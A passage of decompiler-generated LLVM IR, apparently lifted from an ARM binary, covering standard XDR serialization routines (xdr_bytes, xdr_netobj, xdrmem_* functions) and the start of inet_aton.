  uselistorder i32 %v2_188b8, { 1, 2, 3, 0 }
  uselistorder i32 %v0_188a4, { 1, 0 }
  uselistorder i32 %v2_18874, { 0, 1, 3, 2, 4 }
  uselistorder i32* %stack_var_-24, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 8, 7, 10, 9, 11, 13, 12, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_18960, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_18954, { 1, 0 }
  uselistorder label %dec_label_pc_18928, { 1, 0 }
  uselistorder label %dec_label_pc_188a4, { 1, 0 }
  uselistorder label %dec_label_pc_18898, { 1, 0 }
}

define i32 @xdr_wrapstring() local_unnamed_addr {
entry:
  %v0_18978 = load i32, i32* @r0, align 4
  %v1_18978 = load i32, i32* @r1, align 4
  %v3_18978 = inttoptr i32 %v0_18978 to i32*
  %v4_18978 = call i32 @__GI_xdr_string(i32* %v3_18978, i32 %v1_18978, i32 -1)
  %v2_1897c = icmp eq i32 %v4_18978, 0
  br i1 %v2_1897c, label %bb3, label %bb

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v5_18984 = phi i32 [ 0, %entry ], [ 1, %bb ]
  ret i32 %v5_18984

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @xdr_bytes(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_18988 = load i32, i32* @r4, align 4
  store i32 %v3_18988, i32* %stack_var_-24, align 4
  %v6_18988 = load i32, i32* @r5, align 4
  %v9_18988 = load i32, i32* @r6, align 4
  %v12_18988 = load i32, i32* @r7, align 4
  %v15_18988 = load i32, i32* @r8, align 4
  %v18_18988 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @r1, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r7, align 4
  store i32 %tmp, i32* @r6, align 4
  %v1_189a0 = inttoptr i32 %arg2 to i32*
  %v2_189a0 = load i32, i32* %v1_189a0, align 4
  store i32 %v2_189a0, i32* @r4, align 4
  %v2_189a4 = inttoptr i32 %arg3 to i32*
  %v4_189a4 = call i32 @xdr_u_int(i32* %v2_189a4, i32* %v2_189a4)
  %v2_189a8 = icmp eq i32 %v4_189a4, 0
  br i1 %v2_189a8, label %dec_label_pc_18a58, label %dec_label_pc_189b0

dec_label_pc_189b0:                               ; preds = %entry
  %v0_189b0 = load i32, i32* @r5, align 4
  %v1_189b0 = inttoptr i32 %v0_189b0 to i32*
  %v2_189b0 = load i32, i32* %v1_189b0, align 4
  store i32 %v2_189b0, i32* @r5, align 4
  %v1_189b4 = load i32, i32* @r7, align 4
  %tmp11 = icmp ugt i32 %v2_189b0, %v1_189b4
  %v0_189c8.pre = load i32, i32* @r6, align 4
  %.pre = inttoptr i32 %v0_189c8.pre to i32*
  br i1 %tmp11, label %dec_label_pc_189bc, label %dec_label_pc_189c8

dec_label_pc_189bc:                               ; preds = %dec_label_pc_189b0
  %v2_189bc = load i32, i32* %.pre, align 4
  %v7_189c0 = icmp eq i32 %v2_189bc, 2
  br i1 %v7_189c0, label %dec_label_pc_189c8, label %dec_label_pc_18a58

dec_label_pc_189c8:                               ; preds = %dec_label_pc_189b0, %dec_label_pc_189bc
  %v2_189c8 = load i32, i32* %.pre, align 4
  %v7_189cc = icmp eq i32 %v2_189c8, 1
  br i1 %v7_189cc, label %dec_label_pc_189e4, label %dec_label_pc_189d4

dec_label_pc_189d4:                               ; preds = %dec_label_pc_189c8
  %v2_189cc = icmp eq i32 %v2_189c8, 0
  br i1 %v2_189cc, label %dec_label_pc_18a24, label %dec_label_pc_189d8

dec_label_pc_189d8:                               ; preds = %dec_label_pc_189d4
  %v7_189d8 = icmp eq i32 %v2_189c8, 2
  br i1 %v7_189d8, label %dec_label_pc_18a38, label %dec_label_pc_18a58

dec_label_pc_189e4:                               ; preds = %dec_label_pc_189c8
  %v2_189e4 = icmp eq i32 %v2_189b0, 0
  br i1 %v2_189e4, label %dec_label_pc_18a60, label %dec_label_pc_189ec

dec_label_pc_189ec:                               ; preds = %dec_label_pc_189e4
  %v0_189ec = load i32, i32* @r4, align 4
  %v2_189ec = icmp eq i32 %v0_189ec, 0
  br i1 %v2_189ec, label %dec_label_pc_189f4, label %dec_label_pc_18a24

dec_label_pc_189f4:                               ; preds = %dec_label_pc_189ec
  %v1_189f8 = call i32 @malloc(i32 %v2_189b0)
  %v2_189fc = icmp eq i32 %v1_189f8, 0
  store i32 %v1_189f8, i32* @r4, align 4
  %v1_18a04 = load i32, i32* @r8, align 4
  %v2_18a04 = inttoptr i32 %v1_18a04 to i32*
  store i32 %v1_189f8, i32* %v2_18a04, align 4
  br i1 %v2_189fc, label %dec_label_pc_18a0c, label %dec_label_pc_189f4.dec_label_pc_18a24_crit_edge

dec_label_pc_189f4.dec_label_pc_18a24_crit_edge:  ; preds = %dec_label_pc_189f4
  %v0_18a24.pre = load i32, i32* @r6, align 4
  %v0_18a2c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18a24

dec_label_pc_18a0c:                               ; preds = %dec_label_pc_189f4
  %v2_18a14 = load i32, i32* @global_var_2b570, align 4
  %v3_18a18 = call i32 @__GI_fputs(i32 ptrtoint ([26 x i8]* @global_var_1e988.920 to i32), i32 %v2_18a14)
  %v0_18a1c = load i32, i32* @r4, align 4
  %v2_18a20 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_18a20, i32* @r4, align 4
  store i32 %v6_18988, i32* @r5, align 4
  store i32 %v9_18988, i32* @r6, align 4
  store i32 %v12_18988, i32* @r7, align 4
  store i32 %v15_18988, i32* @r8, align 4
  ret i32 %v0_18a1c

dec_label_pc_18a24:                               ; preds = %dec_label_pc_189d4, %dec_label_pc_189f4.dec_label_pc_18a24_crit_edge, %dec_label_pc_189ec
  %v0_18a2c = phi i32 [ %v0_18a2c.pre, %dec_label_pc_189f4.dec_label_pc_18a24_crit_edge ], [ %v2_189b0, %dec_label_pc_189ec ], [ %v2_189b0, %dec_label_pc_189d4 ]
  %v0_18a24 = phi i32 [ %v0_18a24.pre, %dec_label_pc_189f4.dec_label_pc_18a24_crit_edge ], [ %v0_189c8.pre, %dec_label_pc_189ec ], [ %v0_189c8.pre, %dec_label_pc_189d4 ]
  %v0_18a28 = load i32, i32* @r4, align 4
  %v2_18a30 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_18a30, i32* @r4, align 4
  store i32 %v6_18988, i32* @r5, align 4
  store i32 %v9_18988, i32* @r6, align 4
  store i32 %v12_18988, i32* @r7, align 4
  store i32 %v15_18988, i32* @r8, align 4
  store i32 %v18_18988, i32* @lr, align 4
  %v3_18a34 = inttoptr i32 %v0_18a24 to i32*
  %v4_18a34 = call i32 @xdr_opaque(i32* %v3_18a34, i32 %v0_18a28, i32 %v0_18a2c)
  br label %dec_label_pc_18a38

dec_label_pc_18a38:                               ; preds = %dec_label_pc_189d8, %dec_label_pc_18a24
  %v0_18a38 = load i32, i32* @r4, align 4
  %v2_18a38 = icmp eq i32 %v0_18a38, 0
  br i1 %v2_18a38, label %dec_label_pc_18a60, label %dec_label_pc_18a40

dec_label_pc_18a40:                               ; preds = %dec_label_pc_18a38
  store i32 %v0_18a38, i32* @r0, align 4
  %v0_18a44 = call i32 @free()
  %v1_18a50 = load i32, i32* @r8, align 4
  %v2_18a50 = inttoptr i32 %v1_18a50 to i32*
  store i32 0, i32* %v2_18a50, align 4
  %v2_18a54 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_18a54, i32* @r4, align 4
  store i32 %v6_18988, i32* @r5, align 4
  store i32 %v9_18988, i32* @r6, align 4
  store i32 %v12_18988, i32* @r7, align 4
  store i32 %v15_18988, i32* @r8, align 4
  ret i32 1

dec_label_pc_18a58:                               ; preds = %dec_label_pc_189d8, %dec_label_pc_189bc, %entry
  %v2_18a5c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_18a5c, i32* @r4, align 4
  store i32 %v6_18988, i32* @r5, align 4
  store i32 %v9_18988, i32* @r6, align 4
  store i32 %v12_18988, i32* @r7, align 4
  store i32 %v15_18988, i32* @r8, align 4
  ret i32 0

dec_label_pc_18a60:                               ; preds = %dec_label_pc_18a38, %dec_label_pc_189e4
  %v2_18a64 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_18a64, i32* @r4, align 4
  store i32 %v6_18988, i32* @r5, align 4
  store i32 %v9_18988, i32* @r6, align 4
  store i32 %v12_18988, i32* @r7, align 4
  store i32 %v15_18988, i32* @r8, align 4
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_189f8, { 1, 0, 2 }
  uselistorder i32 %v2_189c8, { 0, 2, 1 }
  uselistorder i32 %v0_189c8.pre, { 2, 1, 0 }
  uselistorder i32 %v2_189b0, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v15_18988, { 3, 4, 0, 1, 2 }
  uselistorder i32 %v12_18988, { 3, 4, 0, 1, 2 }
  uselistorder i32 %v9_18988, { 3, 4, 0, 1, 2 }
  uselistorder i32 %v6_18988, { 3, 4, 0, 1, 2 }
  uselistorder i32 (i32*, i32, i32)* @xdr_opaque, { 1, 2, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_18a38, { 1, 0 }
  uselistorder label %dec_label_pc_18a24, { 1, 2, 0 }
  uselistorder label %dec_label_pc_189c8, { 1, 0 }
}

define i32 @xdr_netobj(i32 %arg1) local_unnamed_addr {
entry:
  %v1_18a78 = add i32 %arg1, 4
  %v0_18a7c = load i32, i32* @r0, align 4
  %v4_18a7c = inttoptr i32 %v0_18a7c to i32*
  %v5_18a7c = call i32 @xdr_bytes(i32* %v4_18a7c, i32 %v1_18a78, i32 %arg1, i32 1024)
  ret i32 %v5_18a7c
}

define i32 @__GI_xdrmem_create(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg4, i32* %arg1, align 4
  store i32 ptrtoint (i32* @global_var_1e9a8.922 to i32), i32* %r3.global-to-local, align 4
  %v2_18a88 = add i32 %tmp, 20
  %v3_18a88 = inttoptr i32 %v2_18a88 to i32*
  store i32 %arg3, i32* %v3_18a88, align 4
  %v0_18a8c = load i32, i32* %r3.global-to-local, align 4
  %v2_18a8c = add i32 %tmp, 4
  %v3_18a8c = inttoptr i32 %v2_18a8c to i32*
  store i32 %v0_18a8c, i32* %v3_18a8c, align 4
  %v2_18a90 = add i32 %tmp, 12
  %v3_18a90 = inttoptr i32 %v2_18a90 to i32*
  store i32 %arg2, i32* %v3_18a90, align 4
  %v2_18a94 = add i32 %tmp, 16
  %v3_18a94 = inttoptr i32 %v2_18a94 to i32*
  store i32 %arg2, i32* %v3_18a94, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
}

define i32 @xdrmem_destroy() local_unnamed_addr {
entry:
  %v1_18aa0 = load i32, i32* @r0, align 4
  ret i32 %v1_18aa0
}

define i32 @xdrmem_getlong(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v1_18aa8 = add i32 %arg1, 20
  %v2_18aa8 = inttoptr i32 %v1_18aa8 to i32*
  %v3_18aa8 = load i32, i32* %v2_18aa8, align 4
  store i32 %v3_18aa8, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  %tmp4 = icmp ult i32 %v3_18aa8, 4
  br i1 %tmp4, label %dec_label_pc_18afc, label %dec_label_pc_18ac0

dec_label_pc_18ac0:                               ; preds = %entry
  %v1_18ab0 = add i32 %v3_18aa8, -4
  %v1_18ac0 = add i32 %arg1, 12
  %v2_18ac0 = inttoptr i32 %v1_18ac0 to i32*
  %v3_18ac0 = load i32, i32* %v2_18ac0, align 4
  store i32 %v3_18ac0, i32* %r3.global-to-local, align 4
  store i32 %v1_18ab0, i32* %v2_18aa8, align 4
  %v0_18ac8 = load i32, i32* %r3.global-to-local, align 4
  %v1_18ac8 = inttoptr i32 %v0_18ac8 to i32*
  %v2_18ac8 = load i32, i32* %v1_18ac8, align 4
  %v2_18ae4 = call i32 @llvm.bswap.i32(i32 %v2_18ac8)
  store i32 %v2_18ae4, i32* %r3.global-to-local, align 4
  %v1_18ae8 = load i32, i32* %ip.global-to-local, align 4
  %v2_18ae8 = inttoptr i32 %v1_18ae8 to i32*
  store i32 %v2_18ae4, i32* %v2_18ae8, align 4
  %v3_18aec = load i32, i32* %v2_18ac0, align 4
  %v1_18af0 = add i32 %v3_18aec, 4
  store i32 %v1_18af0, i32* %r3.global-to-local, align 4
  store i32 %v1_18af0, i32* %v2_18ac0, align 4
  br label %dec_label_pc_18afc

dec_label_pc_18afc:                               ; preds = %entry, %dec_label_pc_18ac0
  %v0_18afc = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_18ac0 ]
  ret i32 %v0_18afc

; uselistorder directives
  uselistorder i32 %v2_18ae4, { 1, 0 }
  uselistorder i32* %v2_18ac0, { 1, 0, 2 }
  uselistorder i32 %v3_18aa8, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_18afc, { 1, 0 }
}

define i32 @xdrmem_putlong(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_18b04 = add i32 %arg1, 20
  %v2_18b04 = inttoptr i32 %v1_18b04 to i32*
  %v3_18b04 = load i32, i32* %v2_18b04, align 4
  %tmp = icmp ult i32 %v3_18b04, 4
  br i1 %tmp, label %dec_label_pc_18b54, label %dec_label_pc_18b18

dec_label_pc_18b18:                               ; preds = %entry
  %v1_18b0c = add i32 %v3_18b04, -4
  store i32 %v1_18b0c, i32* %v2_18b04, align 4
  %v2_18b1c = load i32, i32* %arg2, align 4
  %v1_18b38 = add i32 %arg1, 12
  %v2_18b38 = inttoptr i32 %v1_18b38 to i32*
  %v3_18b38 = load i32, i32* %v2_18b38, align 4
  %v2_18b3c = call i32 @llvm.bswap.i32(i32 %v2_18b1c)
  %v2_18b40 = inttoptr i32 %v3_18b38 to i32*
  store i32 %v2_18b3c, i32* %v2_18b40, align 4
  %v3_18b44 = load i32, i32* %v2_18b38, align 4
  %v1_18b48 = add i32 %v3_18b44, 4
  store i32 %v1_18b48, i32* %v2_18b38, align 4
  br label %dec_label_pc_18b54

dec_label_pc_18b54:                               ; preds = %entry, %dec_label_pc_18b18
  %v0_18b54 = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_18b18 ]
  ret i32 %v0_18b54

; uselistorder directives
  uselistorder i32* %v2_18b38, { 1, 0, 2 }
  uselistorder i32 %v3_18b04, { 1, 0 }
  uselistorder label %dec_label_pc_18b54, { 1, 0 }
}

define i32 @xdrmem_getpos(i32 %arg1) local_unnamed_addr {
entry:
  %v1_18b5c = add i32 %arg1, 12
  %v1_18b60 = inttoptr i32 %v1_18b5c to i32*
  %v2_18b60 = load i32, i32* %v1_18b60, align 4
  %v3_18b60 = add i32 %arg1, 16
  %v4_18b60 = inttoptr i32 %v3_18b60 to i32*
  %v5_18b60 = load i32, i32* %v4_18b60, align 4
  %v2_18b64 = sub i32 %v2_18b60, %v5_18b60
  ret i32 %v2_18b64
}

define i32 @xdrmem_setpos(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_18b6c = add i32 %arg1, 20
  %v2_18b6c = inttoptr i32 %v1_18b6c to i32*
  %v3_18b6c = load i32, i32* %v2_18b6c, align 4
  store i32 %arg1, i32* %ip.global-to-local, align 4
  %v1_18b74 = add i32 %arg1, 12
  %v2_18b74 = inttoptr i32 %v1_18b74 to i32*
  %v3_18b74 = load i32, i32* %v2_18b74, align 4
  %v1_18b78 = add i32 %arg1, 16
  %v2_18b78 = inttoptr i32 %v1_18b78 to i32*
  %v3_18b78 = load i32, i32* %v2_18b78, align 4
  %v2_18b7c = add i32 %v3_18b74, %v3_18b6c
  %v2_18b80 = add i32 %v3_18b78, %arg2
  store i32 %v2_18b80, i32* %r1.global-to-local, align 4
  %not.v7_18b90 = icmp sge i32 %v2_18b7c, %v2_18b80
  %. = zext i1 %not.v7_18b90 to i32
  store i32 %., i32* %r0.global-to-local, align 4
  %v7_18b94 = icmp slt i32 %v2_18b7c, %v2_18b80
  br i1 %v7_18b94, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v2_18b88 = sub i32 %v2_18b7c, %v2_18b80
  store i32 %v2_18b88, i32* %v2_18b6c, align 4
  %v8_18b98 = load i32, i32* %r1.global-to-local, align 4
  %v9_18b98 = load i32, i32* %ip.global-to-local, align 4
  %v10_18b98 = add i32 %v9_18b98, 12
  %v11_18b98 = inttoptr i32 %v10_18b98 to i32*
  store i32 %v8_18b98, i32* %v11_18b98, align 4
  %v1_18b9c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v1_18b9c = phi i32 [ %., %entry ], [ %v1_18b9c.pre, %bb ]
  ret i32 %v1_18b9c

; uselistorder directives
  uselistorder i32 %v2_18b80, { 2, 0, 1, 3 }
  uselistorder i32 %v2_18b7c, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1, 4 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @xdrmem_inline(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %v1_18ba0 = add i32 %arg1, 20
  %v2_18ba0 = inttoptr i32 %v1_18ba0 to i32*
  %v3_18ba0 = load i32, i32* %v2_18ba0, align 4
  %v2_18ba4 = sub i32 %v3_18ba0, %arg2
  %v3_18ba4 = icmp ult i32 %v3_18ba0, %arg2
  store i32 0, i32* %r2.global-to-local, align 4
  br i1 %v3_18ba4, label %.thread, label %bb

.thread:                                          ; preds = %entry
  store i32 %v2_18ba4, i32* %ip.global-to-local, align 4
  br label %.thread4

bb:                                               ; preds = %entry
  %v2_18bac = add i32 %arg1, 12
  %v3_18bac = inttoptr i32 %v2_18bac to i32*
  %v4_18bac = load i32, i32* %v3_18bac, align 4
  store i32 %v4_18bac, i32* %r2.global-to-local, align 4
  store i32 %v2_18ba4, i32* %ip.global-to-local, align 4
  %v3_18bb4 = add i32 %v4_18bac, %arg2
  store i32 %v3_18bb4, i32* %v3_18bac, align 4
  %v1_18bbc = load i32, i32* %ip.global-to-local, align 4
  store i32 %v1_18bbc, i32* %v2_18ba0, align 4
  %v0_18bc0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread, %bb
  %v0_18bc0 = phi i32 [ 0, %.thread ], [ %v0_18bc0.pre, %bb ]
  ret i32 %v0_18bc0

; uselistorder directives
  uselistorder i32 %v2_18ba4, { 1, 0 }
  uselistorder i32 %v3_18ba0, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @xdrmem_getint32(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v1_18bcc = add i32 %arg1, 20
  %v2_18bcc = inttoptr i32 %v1_18bcc to i32*
  %v3_18bcc = load i32, i32* %v2_18bcc, align 4
  store i32 %v3_18bcc, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  %tmp4 = icmp ult i32 %v3_18bcc, 4
  br i1 %tmp4, label %dec_label_pc_18c20, label %dec_label_pc_18be4

dec_label_pc_18be4:                               ; preds = %entry
  %v1_18bd4 = add i32 %v3_18bcc, -4
  %v1_18be4 = add i32 %arg1, 12
  %v2_18be4 = inttoptr i32 %v1_18be4 to i32*
  %v3_18be4 = load i32, i32* %v2_18be4, align 4
  store i32 %v3_18be4, i32* %r3.global-to-local, align 4
  store i32 %v1_18bd4, i32* %v2_18bcc, align 4
  %v0_18bec = load i32, i32* %r3.global-to-local, align 4
  %v1_18bec = inttoptr i32 %v0_18bec to i32*
  %v2_18bec = load i32, i32* %v1_18bec, align 4
  %v2_18c08 = call i32 @llvm.bswap.i32(i32 %v2_18bec)
  store i32 %v2_18c08, i32* %r3.global-to-local, align 4
  %v1_18c0c = load i32, i32* %ip.global-to-local, align 4
  %v2_18c0c = inttoptr i32 %v1_18c0c to i32*
  store i32 %v2_18c08, i32* %v2_18c0c, align 4
  %v3_18c10 = load i32, i32* %v2_18be4, align 4
  %v1_18c14 = add i32 %v3_18c10, 4
  store i32 %v1_18c14, i32* %r3.global-to-local, align 4
  store i32 %v1_18c14, i32* %v2_18be4, align 4
  br label %dec_label_pc_18c20

dec_label_pc_18c20:                               ; preds = %entry, %dec_label_pc_18be4
  %v0_18c20 = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_18be4 ]
  ret i32 %v0_18c20

; uselistorder directives
  uselistorder i32 %v2_18c08, { 1, 0 }
  uselistorder i32* %v2_18be4, { 1, 0, 2 }
  uselistorder i32 %v3_18bcc, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_18c20, { 1, 0 }
}

define i32 @xdrmem_putint32(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_18c28 = add i32 %arg1, 20
  %v2_18c28 = inttoptr i32 %v1_18c28 to i32*
  %v3_18c28 = load i32, i32* %v2_18c28, align 4
  %tmp = icmp ult i32 %v3_18c28, 4
  br i1 %tmp, label %dec_label_pc_18c78, label %dec_label_pc_18c3c

dec_label_pc_18c3c:                               ; preds = %entry
  %v1_18c30 = add i32 %v3_18c28, -4
  store i32 %v1_18c30, i32* %v2_18c28, align 4
  %v2_18c40 = load i32, i32* %arg2, align 4
  %v1_18c5c = add i32 %arg1, 12
  %v2_18c5c = inttoptr i32 %v1_18c5c to i32*
  %v3_18c5c = load i32, i32* %v2_18c5c, align 4
  %v2_18c60 = call i32 @llvm.bswap.i32(i32 %v2_18c40)
  %v2_18c64 = inttoptr i32 %v3_18c5c to i32*
  store i32 %v2_18c60, i32* %v2_18c64, align 4
  %v3_18c68 = load i32, i32* %v2_18c5c, align 4
  %v1_18c6c = add i32 %v3_18c68, 4
  store i32 %v1_18c6c, i32* %v2_18c5c, align 4
  br label %dec_label_pc_18c78

dec_label_pc_18c78:                               ; preds = %entry, %dec_label_pc_18c3c
  %v0_18c78 = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_18c3c ]
  ret i32 %v0_18c78

; uselistorder directives
  uselistorder i32* %v2_18c5c, { 1, 0, 2 }
  uselistorder i32 %v3_18c28, { 1, 0 }
  uselistorder label %dec_label_pc_18c78, { 1, 0 }
}

define i32 @xdrmem_putbytes(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  %v1_18c84 = add i32 %arg1, 20
  %v2_18c84 = inttoptr i32 %v1_18c84 to i32*
  %v3_18c84 = load i32, i32* %v2_18c84, align 4
  %v3_18c88 = icmp ult i32 %v3_18c84, %arg2
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  br i1 %v3_18c88, label %bb, label %bb4

bb:                                               ; preds = %entry
  ret i32 0

bb4:                                              ; preds = %entry
  %v2_18c88 = sub i32 %v3_18c84, %arg2
  store i32 %v2_18c88, i32* %v2_18c84, align 4
  %v0_18ca4 = load i32, i32* @r4, align 4
  %v1_18ca4 = add i32 %v0_18ca4, 12
  %v2_18ca4 = inttoptr i32 %v1_18ca4 to i32*
  %v3_18ca4 = load i32, i32* %v2_18ca4, align 4
  store i32 %v3_18ca4, i32* @r0, align 4
  %v0_18ca8 = call i32 @memcpy()
  %v0_18cac = load i32, i32* @r4, align 4
  %v1_18cac = add i32 %v0_18cac, 12
  %v2_18cac = inttoptr i32 %v1_18cac to i32*
  %v3_18cac = load i32, i32* %v2_18cac, align 4
  %v1_18cb4 = load i32, i32* @r5, align 4
  %v2_18cb4 = add i32 %v1_18cb4, %v3_18cac
  store i32 %v2_18cb4, i32* %v2_18cac, align 4
  ret i32 1

; uselistorder directives
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
}

define i32 @xdrmem_getbytes(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg3, i32* @r2, align 4
  %v1_18cc4 = add i32 %arg1, 20
  %v2_18cc4 = inttoptr i32 %v1_18cc4 to i32*
  %v3_18cc4 = load i32, i32* %v2_18cc4, align 4
  %v3_18cc8 = icmp ult i32 %v3_18cc4, %arg3
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg2, i32* @r0, align 4
  br i1 %v3_18cc8, label %dec_label_pc_18d00, label %dec_label_pc_18ce4

dec_label_pc_18ce4:                               ; preds = %entry
  %v2_18cc8 = sub i32 %v3_18cc4, %arg3
  store i32 %v2_18cc8, i32* %v2_18cc4, align 4
  %v0_18ce8 = load i32, i32* @r4, align 4
  %v1_18ce8 = add i32 %v0_18ce8, 12
  %v2_18ce8 = inttoptr i32 %v1_18ce8 to i32*
  %v3_18ce8 = load i32, i32* %v2_18ce8, align 4
  store i32 %v3_18ce8, i32* @r1, align 4
  %v0_18cec = call i32 @memcpy()
  %v0_18cf0 = load i32, i32* @r4, align 4
  %v1_18cf0 = add i32 %v0_18cf0, 12
  %v2_18cf0 = inttoptr i32 %v1_18cf0 to i32*
  %v3_18cf0 = load i32, i32* %v2_18cf0, align 4
  %v1_18cf4 = load i32, i32* @r5, align 4
  %v2_18cf4 = add i32 %v1_18cf4, %v3_18cf0
  store i32 %v2_18cf4, i32* %v2_18cf0, align 4
  br label %dec_label_pc_18d00

dec_label_pc_18d00:                               ; preds = %entry, %dec_label_pc_18ce4
  %v0_18d00 = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_18ce4 ]
  ret i32 %v0_18d00

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_18d00, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_18d08 = load i32, i32* %r0.global-to-local, align 4
  %v2_18d08 = icmp eq i32 %v0_18d08, 0
  %v3_18d0c = load i32, i32* @r4, align 4
  store i32 %v3_18d0c, i32* %stack_var_-20, align 4
  br i1 %v2_18d08, label %dec_label_pc_18de8, label %dec_label_pc_18d24.lr.ph

dec_label_pc_18d24:                               ; preds = %dec_label_pc_18d24.lr.ph, %dec_label_pc_18da8
  %v1_18da8 = phi i32 [ 0, %dec_label_pc_18d24.lr.ph ], [ %v5_18da8, %dec_label_pc_18da8 ]
  %v0_18dac = phi i32 [ 1, %dec_label_pc_18d24.lr.ph ], [ %v1_18dac, %dec_label_pc_18da8 ]
  %v0_18d2c = phi i32 [ %v0_18d08, %dec_label_pc_18d24.lr.ph ], [ %v0_18d2c25, %dec_label_pc_18da8 ]
  store i32 %v2_18d28.pre, i32* @lr, align 4
  %v1_18d2c = inttoptr i32 %v0_18d2c to i8*
  %v2_18d2c = load i8, i8* %v1_18d2c, align 1
  %v3_18d2c = zext i8 %v2_18d2c to i32
  %v3_18d30 = mul nuw nsw i32 %v3_18d2c, 2
  %v4_18d30 = add i32 %v3_18d30, %v2_18d28.pre
  %v5_18d30 = inttoptr i32 %v4_18d30 to i8*
  %v6_18d30 = load i8, i8* %v5_18d30, align 1
  %v1_18d34 = and i8 %v6_18d30, 8
  %v2_18d34 = icmp eq i8 %v1_18d34, 0
  br i1 %v2_18d34, label %dec_label_pc_18de8, label %dec_label_pc_18d3c

dec_label_pc_18d3c:                               ; preds = %dec_label_pc_18d24
  br label %dec_label_pc_18d5c

dec_label_pc_18d44:                               ; preds = %dec_label_pc_18d5c
  %v3_18d48 = mul i32 %v0_18da8, 10
  %v4_18d48 = add i32 %v3_18d5c, %v3_18d48
  %v1_18d4c = add i32 %v4_18d48, -48
  %v8_18d54 = icmp sgt i32 %v1_18d4c, 255
  br i1 %v8_18d54, label %dec_label_pc_18de8, label %dec_label_pc_18d58

dec_label_pc_18d58:                               ; preds = %dec_label_pc_18d44
  %v1_18d58 = add i32 %v0_18d98, 1
  store i32 %v1_18d58, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18d5c

dec_label_pc_18d5c:                               ; preds = %dec_label_pc_18d3c, %dec_label_pc_18d58
  %v0_18da8 = phi i32 [ 0, %dec_label_pc_18d3c ], [ %v1_18d4c, %dec_label_pc_18d58 ]
  %v0_18d98 = phi i32 [ %v0_18d2c, %dec_label_pc_18d3c ], [ %v1_18d58, %dec_label_pc_18d58 ]
